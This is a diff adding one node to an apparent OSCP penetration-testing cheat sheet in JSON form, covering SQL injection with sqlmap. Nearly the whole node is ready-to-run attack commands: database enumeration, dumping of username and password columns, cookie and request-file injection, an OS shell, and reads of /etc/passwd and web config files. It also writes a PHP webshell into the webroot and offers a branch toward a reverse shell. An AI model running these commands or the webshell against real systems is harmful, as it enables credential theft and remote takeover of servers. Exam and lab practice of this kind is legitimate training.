@@ -1,0 +1,26 @@
+{
+  "id": "sqli_sqlmap",
+  "phase": "WEB",
+  "title": "SQLi — sqlmap Full Escalation",
+  "body": "sqlmap is allowed on OSCP. Use it confidently but understand each flag. The escalation ladder: confirm → enumerate → dump → OS shell → file write.",
+  "cmd": "# -- STAGE 1: CONFIRM + FINGERPRINT ------\nsqlmap -u \"http://$ip/page?id=1\" --batch --dbs\n\n# -- STAGE 2: DUMP CREDENTIALS ------------\nsqlmap -u \"http://$ip/page?id=1\" --batch -D [dbname] --tables\nsqlmap -u \"http://$ip/page?id=1\" --batch -D [dbname] -T users --columns\nsqlmap -u \"http://$ip/page?id=1\" --batch -D [dbname] -T users   -C username,password --dump\n\n# -- POST / REQUEST FILE ------------------\n# Capture in Burp → save to req.txt\nsqlmap -r req.txt --batch --level=3 --risk=2 --dbs\n\n# -- COOKIE INJECTION ---------------------\nsqlmap -u \"http://$ip/page\"   --cookie=\"id=1*\" --batch --level=3\n\n# -- AUTHENTICATED SESSION -----------------\nsqlmap -u \"http://$ip/page?id=1\"   --headers=\"Authorization: Bearer TOKEN\" --batch\n\n# -- OS SHELL -----------------------------\n# Requires: MySQL FILE priv OR MSSQL sa/xp_cmdshell\nsqlmap -u \"http://$ip/page?id=1\" --os-shell\n\n# -- FILE READ ----------------------------\nsqlmap -u \"http://$ip/page?id=1\" --file-read=\"/etc/passwd\"\nsqlmap -u \"http://$ip/page?id=1\" --file-read=\"/var/www/html/config.php\"\n\n# -- FILE WRITE (webshell) -----------------\necho '<?php system($_GET[\"cmd\"]); ?>' > /tmp/shell.php\nsqlmap -u \"http://$ip/page?id=1\"   --file-write=\"/tmp/shell.php\"   --file-dest=\"/var/www/html/shell.php\"\n\n# -- MSSQL STACKED QUERIES → SHELL --------\nsqlmap -u \"http://$ip/page?id=1\"   --technique=S --os-shell",
+  "warn": "--os-shell can fail silently. If it opens but commands don't execute: wrong webroot path. Use --file-read to probe config files and confirm the correct path first.",
+  "choices": [
+    {
+      "label": "Dumped credentials",
+      "next": "creds_found"
+    },
+    {
+      "label": "os-shell working — upgrade to reverse shell",
+      "next": "sqli_shell"
+    },
+    {
+      "label": "File write succeeded — webshell live",
+      "next": "sqli_shell"
+    },
+    {
+      "label": "MSSQL — xp_cmdshell",
+      "next": "mssql"
+    }
+  ]
+}
